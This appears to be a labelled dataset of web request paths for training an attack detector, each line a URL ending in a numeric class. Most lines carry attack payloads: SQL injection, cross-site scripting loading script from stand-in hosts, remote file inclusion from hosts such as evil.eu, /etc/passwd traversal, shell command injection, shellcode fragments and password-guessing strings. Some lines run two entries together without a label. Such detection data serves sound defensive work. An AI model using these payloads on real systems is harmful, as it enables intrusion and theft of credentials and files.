/api/v1/login/?username=admin&password=1234,0
/update.php/a?[buffer]=89898,0
/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/page/about-us/?post=%3script>alert(1);,2
/api/v1/customers/?file=http://evil.eu/sh,2
/api/v1/register/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/api/v1/customers/?username=admin&password=1236,0
/authorize.php/?customerId=1OR 1=1,1
/core/files/js/upload.js/?username=admin&password=password,0
/update.php/?username=admin&password=1237,0
/core/files/js/upload.js/?post=%3script>alert(1);,2
/api/v1/orders/?post==<?php print $settings[database][password]; ?>,8
/core/files/js/upload.js/../../../file:///etc/passwd?,4
/login.php/?username=admin&password=admin,0
/login.php/?page=/../../../../../../etc/passwd,4
/core/files/js/upload.js/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/update.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/update.php/?username=admin&password=1236,0
/core/files/js/upload.js/?file=http://evil.eu/root.asp,2
/api/v1/register/?customerId=1OR 1=1,1
/xmlrpc.php/?page=1&customerId=AND%id%IS%NULL;,1
/authorize.php/?ip=| ls -l,8
/register.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/api/v1/customers/?post==<?php print $settings[database][password]; ?>,8
/page/about-us/.env/README.txt?,0
/core/files/js/editor.js/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/login/?user=admin&amount=100000,0
/xmlrpc.php/?user=admin&amount=100000,0
/blog/how-to-shop/a?[buffer]=89898,0
/blog/how-to-shop/?post=%3script>alert(1);,2
/orders.php/?username=admin&password=1236,0
/core/files/js/editor.js/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/update.php/?page=1&customerId=AND%id%IS%NULL;,1
/api/v1/customers/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/orders.php/?file=http://evil.eu/root.asp,2
/api/v1/login/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/update.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/core/files/js/upload.js/?username=admin&password=admin,0
/api/v1/login/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/core/themes/theme.inc/?username=admin&password=1237,0
/register.php/?username=admin&password=1236,0
/api/v1/login/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/api/v1/orders/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/core/files/js/editor.js/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/core/files/js/editor.js/?file=http://evil.eu/root.asp,2
/update.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/api/v1/login/?page=1&customerId=AND%id%IS%NULL;,1
/.env/README.txt?,0
/api/v1/login/?file=http://evil.eu/root.asp,2
/api/v1/orders/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/blog/better-products-for-2019/?file=http://evil.eu/sh,2
/page/about-us/?file=http://evil.eu/sh,2
/api/v1/customers/?username=admin&password=admin2,0
/api/v1/customers/?username=admin&password=1235,0
/cgi-bin/count.cgi/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/index.php/?page=http://192.168.80.128/rfi.php,2
/api/v1/customers/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/connection.php/?username=admin&password=1239,0
/blog/how-to-shop/?ip=| ls -l,8
/core/files/js/upload.js/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/?page=http://192.168.80.128/rfi.php,2
/core/files/js/editor.js/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/xmlrpc.php/?page=/../../../../../../etc/passwd,4
/api/v1/login/?session=vwdefcwec334scfdjr49ccededfewsd,0
/connection.php/?username=admin&password=1235,0
/../../../file:///etc/passwd?,4
/register.php/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1236,0
/index.php/../../../file:///etc/passwd?,4
/core/themes/theme.inc/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/connection.php/?post==<?php print $settings[database][password]; ?>,8
/core/files/js/upload.js/?username=admin&password=1236,0
/blog/how-to-shop/?file=http://evil.eu/sh,2
/index.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/page/about-us/?username=admin&password=1236,0
/api/v1/customers/?page=1&customerId=AND%id%IS%NULL;,1
/register.php/?id=0 or 1=1,1
/register.php/?page=/../../../../../../etc/passwd,4
/login.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/xmlrpc.php/?username=admin&password=1234,0
/blog/our-proposals/?page=1&customerId=AND%id%IS%NULL;,1
/api/v1/customers/?username=admin&password=1238,0
/blog/better-products-for-2019/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/page/about-us/?username=admin&password=1235,0
/cgi-bin/count.cgi/?username=admin&password=admin,0
/cgi-bin/count.cgi/?userid=bob'; update logintable set passwd='0wn3d';--/blog/better-products-for-2019/?user=admin&amount=100000,0
/connection.php/?page=/../../../../../../etc/passwd,4
/api/v1/login/../../../file:///etc/passwd?,4
/core/files/js/upload.js/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/api/v1/register/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/core/files/js/editor.js/?username=admin&password=1238,0
/register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/page/about-us/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/login/?page=http://192.168.80.128/rfi.php,2
/cgi-bin/count.cgi/?username=admin&password=1237,0
/api/v1/orders/?customerId=1OR 1=1,1
/update.php/?username=admin&password=admin,0
/blog/our-proposals/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/api/v1/customers/?customerId=1OR 1=1,1
/register.php/../../../file:///etc/passwd?,4
/cgi-bin/count.cgi/?username=admin&password=admin2,0
/core/themes/theme.inc/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/connection.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/connection.php/?customerId=1OR 1=1,1
/connection.php/?file=http://evil.eu/root.asp,2
/xmlrpc.php/a?[buffer]=89898,0
/authorize.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/better-products-for-2019/?username=admin&password=admin2,0
/core/files/js/editor.js/?page=/../../../../../../etc/passwd,4
/blog/how-to-shop/?username=admin&password=1239,0
/api/v1/register/?username=admin&password=admin2,0
/api/v1/orders/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/themes/theme.inc/?file=http://evil.eu/root.asp,2
/orders.php/?customerId=1OR 1=1,1
/blog/how-to-shop/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/blog/our-proposals/?post=%3script>alert(1);,2
/api/v1/orders/?username=admin&password=1234,0
/cgi-bin/count.cgi/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/core/files/js/editor.js/../../../file:///etc/passwd?,4
/update.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/register.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/authorize.php/?page=http://192.168.80.128/rfi.php,2
/blog/our-proposals/?username=admin&password=admin2,0
/core/files/js/editor.js/.env/README.txt?,0
/page/about-us/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/api/v1/register/?username=admin&password=1235,0
/orders.php/../../../file:///etc/passwd?,4
/blog/how-to-shop/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/how-to-shop/?id=0 or 1=1,1
/index.php/?page=/../../../../../../etc/passwd,4
/authorize.php/?post==<?php print $settings[database][password]; ?>,8
/api/v1/login/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/themes/theme.inc/?username=admin&password=1234,0
/update.php/?customerId=1OR 1=1,1
/core/files/js/editor.js/?username=admin&password=1236,0
/blog/how-to-shop/.env/README.txt?,0
/blog/our-proposals/?page=http://192.168.80.128/rfi.php,2
/page/about-us/?userid=bob'; update logintable set passwd='0wn3d';--/ap/v1/login/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/blog/how-to-shop/?post==<?php print $settings[database][password]; ?>,8
/update.php/?file=http://evil.eu/root.asp,2
/core/files/js/upload.js/.env/README.txt?,0
/core/files/js/editor.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/login.php/?file=http://evil.eu/root.asp,2
/api/v1/orders/?username=admin&password=1238,0
/xmlrpc.php/.env/README.txt?,0
/cgi-bin/count.cgi/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/api/v1/orders/?username=admin&password=1239,0
/register.php/?username=admin&password=admin,0
/authorize.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/orders.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/our-proposals/?file=http://evil.eu/root.asp,2
/connection.php/?username=admin&password=1238,0
/blog/how-to-shop/?username=admin&password=password,0
/api/v1/orders/?username=admin&password=admin,0
/core/themes/theme.inc/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1238,0
/update.php/?id=0 or 1=1,1
/blog/how-to-shop/?userid=bob'; update logintable set passwd='0wn3d';--/orders.php/?page=/../../../../../../etc/passwd,4
/authorize.php/.well-known/assetlinks.json?,0
/blog/how-to-shop/?username=admin&password=admin,0
/register.php/?page=http://192.168.80.128/rfi.php,2
/api/v1/register/?username=admin&password=admin,0
/xmlrpc.php/?username=admin&password=admin,0
/authorize.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/how-to-shop/?username=admin&password=1236,0
/core/files/js/editor.js/\xf9\xa9\xa5\xcc\xa8\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/api/v1/orders/?username=admin&password=1236,0
/xmlrpc.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/orders.php/.well-known/assetlinks.json?,0
/connection.php/?userid=bob'; update logintable set passwd='0wn3d';--/api/v1/orders/?userid=bob'; update logintable setpasswd='0wn3d';--/core/files/js/upload.js/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/core/themes/theme.inc/?userid=bob'; update logintable set passwd='0wn3d';--/api/v1/register/?user=admin&amount=100000,0
/orders.php/?user=admin&amount=100000,0
/core/themes/theme.inc/?user=admin&amount=100000,0
/blog/our-proposals/.well-known/assetlinks.json?,0
/core/files/js/upload.js/?page=http://192.168.80.128/rfi.php,2
/blog/better-products-for-2019/?page=1&customerId=AND%id%IS%NULL;,1
/page/about-us/../../../file:///etc/passwd?,4
/blog/our-proposals/?userid=bob'; update logintable set passwd='0wn3d';--/authorize.php/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1234,0
/api/v1/login/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/core/themes/theme.inc/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/update.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/better-products-for-2019/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/api/v1/customers/?username=admin&password=admin,0
/update.php/../../../file:///etc/passwd?,4
/blog/how-to-shop/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/xmlrpc.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/connection.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/core/files/js/editor.js/?user=admin&amount=100000,0
/page/about-us/?username=admin&password=1238,0
/page/about-us/?session=vwdefcwec334scfdjr49ccededfewsd,0
/xmlrpc.php/?file=http://evil.eu/root.asp,2
/api/v1/orders/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/core/themes/theme.inc/\xf9\xa9\xa5\xcc\a87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/core/themes/theme.inc/.env/README.txt?,0
/blog/how-to-shop/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/authorize.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/blog/better-products-for-2019/?id=0 or 1=1,1
/page/about-us/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/core/files/js/editor.js/?customerId=1OR 1=1,1
/page/about-us/?file=http://evil.eu/root.asp,2
/core/themes/theme.inc/?page=1&customerId=AND%id%IS%NULL;,1
/cgi-bin/count.cgi/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/authorize.php/?username=admin&password=password,0
/core/themes/theme.inc/?ip=| ls -l,8
/api/v1/orders/../../../file:///etc/passwd?,4
/blog/how-to-shop/?user=admin&amount=100000,0
/xmlrpc.php/?file=http://evil.eu/sh,2
/blog/better-products-for-2019/.well-known/assetlinks.json?,0
/api/v1/customers/?page=/../../../../../../etc/passwd,4
/api/v1/orders/a?[buffer]=89898,0
/authorize.php/?username=admin&password=1236,0
/core/themes/theme.inc/?id=0 or 1=1,1
/page/about-us/?page=/../../../../../../etc/passwd,4
/update.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/how-to-shop/?file=http://evil.eu/root.asp,2
/blog/our-proposals/?username=admin&password=1234,0
/page/about-us/?id=0 or 1=1,1
/blog/our-proposals/?username=admin&password=1235,0
/blog/better-products-for-2019/?username=admin&password=1235,0
/api/v1/orders/?username=admin&password=password,0
/update.php/?page=http://192.168.80.128/rfi.php,2
/register.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/authorize.php/?username=admin&password=1237,0
/api/v1/orders/?page=/../../../../../../etc/passwd,4
/cgi-bin/count.cgi/?ip=| ls -l,8
/blog/how-to-shop/?username=admin&password=1234,0
/xmlrpc.php/?ip=| ls -l,8
/cgi-bin/count.cgi/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/update.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/customers/?username=admin&password=1239,0
/blog/our-proposals/?ip=| ls -l,8
/xmlrpc.php/?username=admin&password=admin2,0
/api/v1/register/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/.env/README.txt?,0
/xmlrpc.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/cgi-bin/count.cgi/?page=1&customerId=AND%id%IS%NULL;,1
/connection.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/orders.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/page/about-us/?username=admin&password=admin2,0
/authorize.php/?username=admin&password=1238,0
/page/about-us/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/page/about-us/?username=admin&password=1239,0
/orders.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/customers/?page=http://192.168.80.128/rfi.php,2
/page/about-us/?page=http://192.168.80.128/rfi.php,2
/api/v1/customers/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/page/about-us/?username=admin&password=admin,0
/connection.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/core/themes/theme.inc/.well-known/assetlinks.json?,0
/blog/better-products-for-2019/?customerId=1OR 1=1,1
/xmlrpc.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/blog/better-products-for-2019/?post=%3script>alert(1);,2
/orders.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/api/v1/orders/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/our-proposals/?page=/../../../../../../etc/passwd,4
/xmlrpc.php/?username=admin&password=1239,0
/cgi-bin/count.cgi/.env/README.txt?,0
/xmlrpc.php/?username=admin&password=1236,0
/cgi-bin/count.cgi/?customerId=1OR 1=1,1
/blog/better-products-for-2019/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/blog/how-to-shop/?page=1&customerId=AND%id%IS%NULL;,1
/blog/how-to-shop/?username=admin&password=admin2,0
/core/themes/theme.inc/?username=admin&password=1235,0
/page/about-us/?username=admin&password=password,0
/blog/our-proposals/?id=0 or 1=1,1
/authorize.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/core/files/js/upload.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/cgi-bin/count.cgi/?username=admin&password=1239,0
/blog/how-to-shop/?customerId=1OR 1=1,1
/blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?>,8
/blog/how-to-shop/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/blog/our-proposals/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/xmlrpc.php/?username=admin&password=1235,0
/blog/better-products-for-2019/?username=admin&password=1238,0
/blog/better-products-for-2019/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/core/themes/theme.inc/?page=/../../../../../../etc/passwd,4
/authorize.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/core/themes/theme.inc/?username=admin&password=admin,0
/core/themes/theme.inc/../../../file:///etc/passwd?,4
/xmlrpc.php/../../../file:///etc/passwd?,4
/xmlrpc.php/?username=admin&password=password,0
/blog/better-products-for-2019/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/orders/?user=admin&amount=100000,0
/core/themes/theme.inc/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/blog/our-proposals/?session=vwdefcwec334scfdjr49ccededfewsd,0
/core/themes/theme.inc/?page=http://192.168.80.128/rfi.php,2
/core/themes/theme.inc/?customerId=1OR 1=1,1
/blog/better-products-for-2019/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/better-products-for-2019/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/authorize.php/../../../file:///etc/passwd?,4
/authorize.php/?user=admin&amount=100000,0
/blog/our-proposals/?post==<?php print $settings[database][password]; ?>,8
/blog/how-to-shop/?page=http://192.168.80.128/rfi.php,2
/authorize.php/?username=admin&password=admin2,0
/blog/our-proposals/?customerId=1OR 1=1,1
/blog/our-proposals/?username=admin&password=1236,0
/blog/how-to-shop/?username=admin&password=1237,0
/blog/how-to-shop/.well-known/assetlinks.json?,0
/page/about-us/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/better-products-for-2019/?username=admin&password=1236,0
/xmlrpc.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/cgi-bin/count.cgi/a?[buffer]=89898,0
/api/v1/orders/?session=vwdefcwec334scfdjr49ccededfewsd,0
/xmlrpc.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/xmlrpc.php/?username=admin&password=1237,0
/blog/better-products-for-2019/?username=admin&password=admin,0
/cgi-bin/count.cgi/?page=/../../../../../../etc/passwd,4
/blog/how-to-shop/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/?page=1&customerId=AND%id%IS%NULL;,1
/xmlrpc.php/.well-known/assetlinks.json?,0
/blog/our-proposals/?username=admin&password=1238,0
/page/about-us/a?[buffer]=89898,0
/core/themes/theme.inc/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/how-to-shop/../../../file:///etc/passwd?,4
/xmlrpc.php/?page=http://192.168.80.128/rfi.php,2
/authorize.php/?username=admin&password=admin,0
/authorize.php/?page=/../../../../../../etc/passwd,4
/core/themes/theme.inc/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/our-proposals/?user=admin&amount=100000,0
/cgi-bin/count.cgi/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/our-proposals/.env/README.txt?,0
/blog/how-to-shop/?page=/../../../../../../etc/passwd,4
/authorize.php/?file=http://evil.eu/root.asp,2
/blog/our-proposals/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/our-proposals/?username=admin&password=1237,0
/blog/better-products-for-2019/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/cgi-bin/count.cgi/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/better-products-for-2019/?username=admin&password=1239,0
/cgi-bin/count.cgi/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/cgi-bin/count.cgi/.well-known/assetlinks.json?,0
/xmlrpc.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/our-proposals/../../../file:///etc/passwd?,4
/blog/better-products-for-2019/../../../file:///etc/passwd?,4
/blog/our-proposals/?username=admin&password=1239,0
/blog/how-to-shop/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/better-products-for-2019/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/blog/how-to-shop/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/page/about-us/?customerId=1OR 1=1,1
/blog/better-products-for-2019/a?[buffer]=89898,0
/blog/how-to-shop/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/blog/our-proposals/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/our-proposals/?username=admin&password=admin,0
/blog/better-products-for-2019/?ip=| ls -l,8
/page/about-us/?user=admin&amount=100000,0
/blog/our-proposals/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/blog/better-products-for-2019/?username=admin&password=password,0
/xmlrpc.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/core/themes/theme.inc/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/cgi-bin/count.cgi/?page=http://192.168.80.128/rfi.php,2
/blog/better-products-for-2019/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/xmlrpc.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
